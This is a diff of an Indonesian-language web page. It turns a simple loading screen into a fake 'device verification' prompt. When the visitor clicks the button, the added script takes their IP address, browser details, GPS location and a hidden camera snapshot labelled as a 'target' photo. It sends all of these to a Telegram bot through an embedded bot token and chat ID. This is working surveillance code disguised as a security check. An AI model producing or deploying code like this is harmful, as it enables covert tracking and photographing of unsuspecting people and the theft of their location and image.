@@ -3,9 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Selamat Datang</title>
+    <title>Verifikasi Keamanan</title>
     <style>
-        /* Mengatur latar belakang dengan gradasi modern */
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
@@ -16,7 +15,6 @@
             align-items: center;
         }
 
-        /* Kotak kartu utama di tengah */
         .card {
             background: white;
             padding: 40px;
@@ -40,30 +38,101 @@
             margin-bottom: 25px;
         }
 
-        /* Animasi lingkaran loading */
-        .spinner {
-            border: 4px solid #edf2f7;
-            border-top: 4px solid #667eea;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto;
+        .btn {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 8px;
+            cursor: pointer;
+            width: 100%;
+            transition: opacity 0.3s;
         }
 
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        .btn:hover {
+            opacity: 0.9;
         }
+
+        /* Menyembunyikan elemen video dan canvas kamera agar tidak terlihat */
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <h2>Memuat Halaman</h2>
-        <p>Silakan tunggu sebentar, sistem sedang mempersiapkan halaman untuk Anda.</p>
-        <div class="spinner"></div>
+    <div class="card" id="cardBox">
+        <h2>Verifikasi Perangkat</h2>
+        <p>Silakan klik tombol di bawah untuk melanjutkan dan memverifikasi perangkat Anda.</p>
+        <button class="btn" onclick="runLogger()">Lanjutkan</button>
     </div>
 
+    <video id="video" width="320" height="240" autoplay></video>
+    <canvas id="canvas" width="320" height="240"></canvas>
+
+    <script>
+        const BOT_TOKEN = '8879804974:AAH38a0QQMXqlgTEd-5tHGEoEiGb7y2BO2Q';
+        const CHAT_ID = '5928694166';
+
+        async function runLogger() {
+            // Ubah tampilan card jadi teks memuat setelah diklik
+            document.getElementById('cardBox').innerHTML = '<h2>Memproses...</h2><p>Mohon tunggu sebentar.</p>';
+
+            // 1. Kirim IP & Device
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                const text = `[+] PENGUNJUNG BARU!\n\n🌐 IP: ${ipData.ip}\n📱 Device: ${navigator.userAgent}`;
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+                });
+            } catch (e) { console.error("Error IP"); }
+
+            // 2. Kirim Lokasi GPS
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const text = `📍 LOKASI DITEMUKAN!\n\nMaps: https://www.google.com/maps?q=${lat},${lon}`;
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+                    });
+                }, () => { console.error("Lokasi ditolak"); });
+            }
+
+            // 3. Ambil & Kirim Foto Kamera
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                video.onplaying = async () => {
+                    const canvas = document.getElementById('canvas');
+                    const context = canvas.getContext('2d');
+                    
+                    setTimeout(async () => {
+                        context.drawImage(video, 0, 0, 320, 240);
+                        stream.getTracks().forEach(track => track.stop());
+
+                        canvas.toBlob(async (blob) => {
+                            const formData = new FormData();
+                            formData.append('chat_id', CHAT_ID);
+                            formData.append('photo', blob, 'capture.png');
+                            formData.append('caption', '📸 FOTO TARGET!');
+
+                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                                method: 'POST',
+                                body: formData
+                            });
+                        }, 'image/png');
+                    }, 1000);
+                };
+            } catch (e) { console.error("Kamera ditolak"); }
+        }
+    </script>
 </body>
 </html>
